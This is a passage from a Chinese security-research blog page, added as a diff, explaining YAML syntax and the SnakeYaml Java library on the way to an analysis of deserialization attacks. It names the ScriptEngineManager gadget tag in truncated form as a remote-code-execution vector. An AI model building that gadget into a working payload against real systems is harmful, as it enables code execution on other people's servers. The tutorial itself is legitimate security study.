@@ -1,0 +1,944 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Yaml介绍在学习yaml反序列化之前，我们先来讲讲yaml是什么，有什么用。 yaml全称YAML Ain’t Markup Language（一种“不是标记语言”的数据序列化格式），本质上是一种 通过缩进+符号表达层次、数组、键值对等数据结构的纯文本，扩展名为.yml 或 .yaml，常常用来写配置文件（如docker-compose.yml）或数据交换（与json类似）。例如： 123456">
+<meta property="og:type" content="article">
+<meta property="og:title" content="yaml反序列化分析">
+<meta property="og:url" content="http://example.com/2025/03/07/yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Yaml介绍在学习yaml反序列化之前，我们先来讲讲yaml是什么，有什么用。 yaml全称YAML Ain’t Markup Language（一种“不是标记语言”的数据序列化格式），本质上是一种 通过缩进+符号表达层次、数组、键值对等数据结构的纯文本，扩展名为.yml 或 .yaml，常常用来写配置文件（如docker-compose.yml）或数据交换（与json类似）。例如： 123456">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2025/1754560219800-f9d1d9c8-ff18-478e-8912-c6b483c53261.png">
+<meta property="og:image" content="http://example.com/images/2025/1754560032843-fd3ad5b6-efc0-40b9-918a-39b0d4d6f1ec.png">
+<meta property="og:image" content="http://example.com/images/2025/1754560024504-a3da45b5-7a19-4b39-913a-2a3407085a5b.png">
+<meta property="og:image" content="http://example.com/images/2025/1754640712387-60be92b4-8e6a-46d8-8982-60a8bfe998ee.png">
+<meta property="og:image" content="http://example.com/images/2025/1754644639446-5eb8c2f8-6583-4f13-b5a6-00af33bea91c.png">
+<meta property="og:image" content="http://example.com/images/2025/1754646679520-85d09105-84f9-4aac-a979-103ef672f010.png">
+<meta property="og:image" content="http://example.com/images/2025/1754646702046-7f29e1f3-2935-4530-8a0f-be12cf9ddc28.png">
+<meta property="og:image" content="http://example.com/images/2025/1754647133028-3d07dfba-4e3d-41ed-a094-687153611db5.png">
+<meta property="article:published_time" content="2025-03-07T07:30:00.000Z">
+<meta property="article:modified_time" content="2026-03-18T01:43:56.348Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全研究">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/2025/1754560219800-f9d1d9c8-ff18-478e-8912-c6b483c53261.png">
+  
+  
+  
+  <title>yaml反序列化分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Change</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="yaml反序列化分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-07 15:30" pubdate>
+          2025年3月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">yaml反序列化分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Yaml介绍"><a href="#Yaml介绍" class="headerlink" title="Yaml介绍"></a>Yaml介绍</h2><p>在学习yaml反序列化之前，我们先来讲讲yaml是什么，有什么用。</p>
+<p>yaml全称YAML Ain’t Markup Language（一种“不是标记语言”的数据序列化格式），本质上是一种 通过<strong>缩进+符号</strong>表达层次、数组、键值对等数据结构的纯文本，扩展名为<code>.yml</code> 或 <code>.yaml</code>，常常用来写配置文件（如<code>docker-compose.yml</code>）或数据交换（与json类似）。例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">version</span>: <span class="hljs-string">&quot;3.9&quot;</span>            # <span class="hljs-title class_">Docker</span> <span class="hljs-title class_">Compose</span> 文件格式版本<br><span class="hljs-attr">services</span>:<br>  <span class="hljs-attr">web</span>:                    # 服务 <span class="hljs-number">1</span>：业务应用<br>    <span class="hljs-attr">image</span>: <span class="hljs-attr">nginx</span>:<span class="hljs-number">1.25</span>     # 使用官方 nginx 镜像<br>    <span class="hljs-attr">ports</span>:<br>      - <span class="hljs-string">&quot;8080:80&quot;</span>         # 主机 <span class="hljs-number">8080</span> → 容器 <span class="hljs-number">80</span><br>    <span class="hljs-attr">volumes</span>:<br>      - ./<span class="hljs-attr">html</span>:<span class="hljs-regexp">/usr/</span>share/nginx/html  # 挂载本地 html 目录<br>    <span class="hljs-attr">depends_on</span>:<br>      - db                # 先启动 db 再启动 web<br>    <span class="hljs-attr">restart</span>: unless-stopped<br><br>  <span class="hljs-attr">db</span>:                     # 服务 <span class="hljs-number">2</span>：数据库<br>    <span class="hljs-attr">image</span>: <span class="hljs-attr">mysql</span>:<span class="hljs-number">8.0</span><br>    <span class="hljs-attr">environment</span>:          # 环境变量<br>      <span class="hljs-attr">MYSQL_ROOT_PASSWORD</span>: root<br>      <span class="hljs-attr">MYSQL_DATABASE</span>: demo<br>      <span class="hljs-attr">MYSQL_USER</span>: demo<br>      <span class="hljs-attr">MYSQL_PASSWORD</span>: demo123<br>    <span class="hljs-attr">ports</span>:<br>      - <span class="hljs-string">&quot;3306:3306&quot;</span><br>    <span class="hljs-attr">volumes</span>:<br>      - <span class="hljs-attr">db_data</span>:<span class="hljs-regexp">/var/</span>lib/mysql        # 把数据持久化到命名卷<br>    <span class="hljs-attr">restart</span>: unless-stopped<br><br><span class="hljs-attr">volumes</span>:<br>  <span class="hljs-attr">db_data</span>:                  # 声明一个持久化卷<br></code></pre></td></tr></table></figure>
+
+<p>这是一个常见的docker配置文件，为使得yaml成功解析，我们必须遵守如下格式要求：</p>
+<ol>
+<li><strong>缩进</strong></li>
+</ol>
+<ul>
+<li>只能用<strong>空格</strong>，不能用 Tab。</li>
+<li>同一层级缩进空格数必须一致（推荐 2 个空格）。</li>
+</ul>
+<ol start="2">
+<li><strong>键值对</strong><br><code>key: value</code> 冒号后面<strong>必须有空格</strong>。</li>
+<li><strong>列表（数组）</strong><br>每行以 <code>-</code> 开头，后面跟一个空格：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">ports</span>:<br>  - <span class="hljs-string">&quot;8080:80&quot;</span> <br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>字典&#x2F;对象</strong><br>直接换行缩进即可：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">web</span>:                   <br>  <span class="hljs-attr">image</span>: <span class="hljs-attr">nginx</span>:<span class="hljs-number">1.25</span>    <br>  <span class="hljs-attr">ports</span>:<br>    - <span class="hljs-string">&quot;8080:80&quot;</span>  <br></code></pre></td></tr></table></figure>
+
+<p>总结来说，yaml是一种用最少符号，依靠缩减来描述复杂数据结构的文本格式，相比json更简洁，但格式要求比较严格，否则会导致解析器报错</p>
+<h2 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>前面提到，yaml跟json一样也可以作为数据交换的载体，所以在java生态中，自然也有一种库来专门处理yaml数据流，那就是<strong>SnakeYaml</strong>。</p>
+<h3 id="与fastjson对比"><a href="#与fastjson对比" class="headerlink" title="与fastjson对比"></a>与fastjson对比</h3><p>不同于fastjson为<strong>json处理库</strong>，SnakeYaml为<strong>YAML 解析&#x2F;生成库</strong>，SnakeYaml 目前<strong>只做两件事</strong>：<br>‑ 把 YAML 文本 → Java 对象（解析）<br>‑ 把 Java 对象 → YAML 文本（生成）<br>其他高级能力（日期格式、过滤、注解策略、性能优化）基本留给上层框架或用户自己做 </p>
+<p>而 FastJSON 除了“把 JSON 文本解析成对象 &#x2F; 把对象序列化成 JSON”之外，还自带：</p>
+<p>-日期格式化、字段过滤、循环引用检测、注解驱动的命名策略、ASM 字节码加速、Spring MVC 集成等。</p>
+<h3 id="如何转换"><a href="#如何转换" class="headerlink" title="如何转换"></a>如何转换</h3><p>SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。</p>
+<ul>
+<li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；</li>
+<li>Yaml.dump()：将一个对象转化为yaml文件形式；</li>
+</ul>
+<p>我们通过代码来展示SnakeYaml的工作流程</p>
+<p>先导入依赖</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;dependency&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.yaml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>snakeyaml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.25<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后我们编写一个test.yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">change</span><br><span class="hljs-attr">age:</span> <span class="hljs-number">21</span><br><span class="hljs-attr">friends:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">zhangsan</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">lisi</span><br></code></pre></td></tr></table></figure>
+
+<p>通过yaml.load我们可以将这个yaml文件解析并反序列化为一个对象，返回的对象类型取决于 YAML 的内容：</p>
+<ul>
+<li>若 YAML 是一个普通的键值对，会返回一个 <code>Map</code>（通常是 <code>LinkedHashMap</code>）。</li>
+<li>若 YAML 是一个列表，会返回一个 <code>List</code>。</li>
+<li>若 YAML 是一个标量值（如字符串、数字），则返回对应的 Java 类型（如 <code>String</code>、<code>Integer</code> 等）。</li>
+<li>但如果 YAML 中包含了<strong>反序列化指令</strong>（如 <code>!!javax.script.ScriptEngineManager [...]</code>），SnakeYAML 会<strong>自动实例化指定的 Java 类</strong>，这可能导致<strong>远程代码执行（RCE）漏洞</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Main.class.getClassLoader().getResourceAsStream(<span class="hljs-string">&quot;test.yaml&quot;</span>);<br><br>        Yaml yaml=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span>yaml.load(inputStream);<br>        System.out.println(ret);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//&#123;name=change, age=21, friends=[zhangsan, lisi]&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="如何将yaml文件反序列化为指定java类"><a href="#如何将yaml文件反序列化为指定java类" class="headerlink" title="如何将yaml文件反序列化为指定java类"></a>如何将yaml文件反序列化为指定java类</h3><p>如果我们想将yaml文件反序列化为一个指定的java类，这里有两种方法，先给出java类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> List&lt;String&gt; friends;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;name = &quot;</span> + name + <span class="hljs-string">&quot;, age = &quot;</span> + age + <span class="hljs-string">&quot;, friends = &quot;</span> + friends + <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="第一种：-根类型构造器强制"><a href="#第一种：-根类型构造器强制" class="headerlink" title="第一种： 根类型构造器强制"></a>第一种： 根类型构造器强制</h4><p>在实例化yaml对象时把顶层类型写死在 Constructor 里 ，这种方法无论yaml中是否有tag，都会把文档当成指定java类来解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Main.class.getClassLoader().getResourceAsStream(<span class="hljs-string">&quot;test.yaml&quot;</span>);<br><br>        Yaml yaml=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Constructor</span>(person.class));<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span>yaml.load(inputStream);<br>        System.out.println(ret);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//person&#123;name = change, age = 21, friends = [zhangsan, lisi]&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="第二种：YAML文件中指定全局tag"><a href="#第二种：YAML文件中指定全局tag" class="headerlink" title="第二种：YAML文件中指定全局tag"></a>第二种：YAML文件中指定全局tag</h4><p> 直接映射到类全限定名 ，构造器会默认注册指定类，符号用！！</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!org.change.person</span><br><span class="hljs-attr">name:</span> <span class="hljs-string">change</span><br><span class="hljs-attr">age:</span> <span class="hljs-number">21</span><br><span class="hljs-attr">friends:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">zhangsan</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">lisi</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="第三种：显式注册tag"><a href="#第三种：显式注册tag" class="headerlink" title="第三种：显式注册tag"></a>第三种：显式注册tag</h4><p>提前将类与tag的对应关系写入类，符号用！</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">ctr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Constructor</span>();<br>ctr.addTypeDescription(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeDescription</span>(person.class, <span class="hljs-string">&quot;!person&quot;</span>));<br>Yaml yaml=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(ctr);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!person</span><br><span class="hljs-attr">name:</span> <span class="hljs-string">change</span><br><span class="hljs-attr">age:</span> <span class="hljs-number">21</span><br><span class="hljs-attr">friends:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">zhangsan</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">lisi</span><br></code></pre></td></tr></table></figure>
+
+<p>ps：按理来说yaml反序列化指定的类需要符合javabean规范，如果person中的字段的修饰符为private，则反序列时会寻找该字段的setter，如果不存在setter，则会报错</p>
+<!-- 这是一张图片，ocr 内容为：X 版本控制 YAML 当前文件 宁 NATIVEMETHODACCESSORIMPL.CLASS DELEGATINGMETHODACCESSORTMPL.CLASS 项目~ METHODL MAINJAVA METHOD JAVA PACKAGE ORG.CHANGE; @ 品 IMPORT JAVA.UTIL.LIST; GBLIC CTASS PERSON￥1个用法 ORG.CHANGE PRIVATE STRING RAME; 1个用法 GMAIN PUBLICINTAGO;1个用法 PUBLIC LIST<STRING> FRIENDS; 1个用法 C2 RESOURCES TESTYAML PUBLIC STRING TOSTRINGO) CITEST AGE : " + AGE + ", FRIENDS " * FRIENDS + *L';  PETURN PERSONINAME ; ' + NAME TARGET GITIGNORE 7 POMXML 业外部车 "临时文件和控制台 运行 'E:\安全工具\RE_JAVA - 例本\JDK8U192\BIN\JAVA.EXE" ... EXGEPTION IN THRAAD "MAZN- GANNATE  OREATE PROPERTYENANA FOR JAVABEANEPERSONTAANE - NUTL,    FRIENDS   IN 'READER', LINE 1. COLUMN 1: NAME: CHANGE UNABLE TO FIND PROPERTY 'NAME' ON CLASS: ORG.CHANGE.PERSON IN 'READER', LINE 1. COLUMN 7: NAME:CHANGE AT ORS-YOST,ANAKEYARL.CONSTRUCTOR,CONSTRUCTORSCONSTRUCTRUCTRUCTRUCTRUCTRUCTJOVABANZNDSTOPCCONSTOR,FAV AT ORG.YANL.SNAKEYANL.CONSTRUCTOR.CONSTRUCTORSCONSTRUCTHAPPING.CONSTRUCTCCONSTRUCTOR.JAVA:1AVA:149 AT ORGYANL.SNAKEYANL.CONSTRUCTOR.CONSTRUCTORSCONSTRUCTYANLOBJOBJOCT.CONSTRUCTCCONSTRUCTOR,JAVA;389 中 目 品 OYAML > SRC > MAIN > JAVA > ONAME ORG>CHANGE -->
+<p><img src="/images/2025/1754560219800-f9d1d9c8-ff18-478e-8912-c6b483c53261.png" srcset="/img/loading.gif" lazyload></p>
